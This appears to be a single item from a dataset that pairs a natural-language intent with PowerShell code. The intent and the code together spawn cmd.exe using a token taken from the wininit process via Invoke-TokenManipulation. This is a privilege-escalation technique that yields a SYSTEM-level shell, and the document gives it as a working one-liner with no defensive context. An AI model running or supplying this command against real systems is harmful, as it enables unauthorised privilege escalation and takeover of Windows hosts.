# Natural language intent:
# Create a new process for 'cmd.exe' using token manipulation on the wininit process and wait for the process to exit.

(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()
